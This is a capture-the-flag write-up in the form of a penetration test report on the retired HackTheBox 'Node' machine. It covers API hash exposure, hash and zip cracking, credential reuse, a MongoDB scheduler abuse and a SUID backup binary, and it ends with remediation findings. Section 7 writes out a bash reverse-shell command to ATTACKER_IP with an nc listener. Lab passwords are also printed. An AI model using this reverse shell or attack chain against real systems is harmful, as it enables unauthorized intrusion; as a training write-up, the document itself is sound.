# HTB Node - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-2-17

---

## 0. Lesson Learned

Read the source code.

---

## 1. Executive Summary

An external penetration test was conducted against the target host. Initial access was achieved through exploitation of an insecure API endpoint which exposed password hashes. These credentials were cracked offline, allowing authenticated access to an administrative backup function. The backup contained hardcoded database credentials, which enabled SSH access as a low-privileged user.

Privilege escalation to root was achieved through abuse of a scheduler service that executed arbitrary commands from a MongoDB collection and through exploitation of a SUID binary that improperly handled privileged file backups.

Root-level access was successfully obtained.

---

## 2. Scope

- **Target:** 10.129.254.164
- **Environment:** HackTheBox Node (Retired Machine)
- **Testing Window:** 2026-2-11 to 2026-2-17
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP-port scan was run with Nmap:

```
nmap -p- -sCV 10.129.254.164 -T4 -oA node_initial
```

Identified open services:

- 22/tcp - OpenSSH 7.2p2 Ubuntu
- 3000/tcp - Node.js application

---

## 5. Enumeration

Inspected JavaScript files identified API endpoints:

- `/api/users`
- `/api/session`
- `/api/admin/backup`

User hashes were retrieved by accessing the following endpoint:

```
http://10.129.254.164:3000/api/users
```

---

## 6. Initial Access

Hashes were identified as SHA-256 using `hashid` and cracked with hashcat:

```
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```
tom : spongebob
mark : snowflake
myP14ceAdm1nAcc0uNT : manchester

```

Administrative access was achieved by logging in as `myP14ceAdm1nAcc0uNT` and the backup file was downloaded.

The backup file was identified as Base64 encoded and decoded to a password protected zip file that was cracked with john:

```
base64 -d myplace.backup > backup.zip

zip2john backup.zip > backuphash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt backuphash.txt
```

The zip password of `magicword` was revealed and used to unzip the backup file:

```
unzip backup.zip
```

Examining the backup files revealed the web app files:

```
cat /var/www/myplace/app.js
```

The following MongoDB credentials were hard-coded in the app:

```
mark : 5AYRft73VtFpc84k
```

Credential reuse allowed SSH access:

```
ssh mark@10.129.254.164
```

Resulting in successful login as mark.

---

## 7. Post-Exploitation

Internal service discovery found MongoDB on localhost port 27017:

```
netstat -tunlp
```

Checking running processes revealed a scheduler app:

```
ps aux
```

Reading the associated file revealed arbitrary command execution every 30 seconds:

```
cat /var/scheduler/app.js
```

User mark was connected with mongo:

```
mongo -u mark -p 5AYRft73VtFpc84k scheduler
```

A reverse shell was inserted:

```
db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'"})
```

With listener:

```
nc -lnvp 443
```

Resulting in a shell as user tom and the user flag was discovered:

```
cat /home/tom/user.txt
```

---

## 8. Privilege Escalation

SUID binaries were enumerated:

```
find / -perm -4000 -ls 2>/dev/null
```

Revealing another backup process at

```
/usr/local/bin/backup
```

Analyzing the app.js file revealed the command format:

```
/usr/local/bin/backup -q backup_key dirname
```

Examining strace revealed the key location to be `/etc/myplace/keys`:

```
strace /usr/local/bin/backup 1 2 3
```

And binary analysis indicated `/root` to be blacklisted.

To circumvent the blacklist, the following command was run from `/` directory:

```
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root
```

This resulted in a Base64 to zip flag to be decoded:

```
base64 -d test.b64 > test.zip

7z e test.zip
```

Producing a `root.txt` file with the root flag.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
cat /home/tom/user.txt
```

**Root Flag**: *REDACTED*

```
cat /root/root.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Broken Access Control in API Endpoint

**Severity:** High

**Description:**
An API endpoint lacked proper authorization checks, allowing unauthorized users to access restricted functionality.

**Impact:**
Attackers could perform privileged actions or access sensitive data without proper authentication.

**Recommendation:**
Implement proper access control checks on all API endpoints and enforce role-based access control.

### **Finding:** Hardcoded Credentials in Source Code

**Severity:** High

**Description:**
Sensitive credentials were embedded directly within application source code accessible to low-privileged users.

**Impact:**
Attackers could retrieve credentials and use them to gain unauthorized access to services or escalate privileges.

**Recommendation:**
Remove hardcoded credentials from source code, use secure configuration storage or secret management solutions, and restrict access to sensitive files.

### **Finding:** Insecure Command Execution via MongoDB Scheduler

**Severity:** Critical

**Description:**
A scheduled task executed user-controlled commands through a MongoDB-backed scheduler, allowing arbitrary command execution with elevated privileges.

**Impact:**
Attackers could execute arbitrary commands and escalate privileges to root or SYSTEM.

**Recommendation:**
Sanitize and validate all scheduler commands, restrict MongoDB access, and enforce least-privilege execution for scheduled tasks.

### **Finding:** Improperly Configured SUID Binary Allowing Arbitrary Backups

**Severity:** Critical

**Description:**
A SUID binary allowed low-privileged users to perform backup operations with elevated privileges, enabling arbitrary command execution.

**Impact:**
Attackers could exploit the SUID binary to escalate privileges to root.

**Recommendation:**
Remove unnecessary SUID permissions, restrict privileged binaries, and enforce least-privilege principles.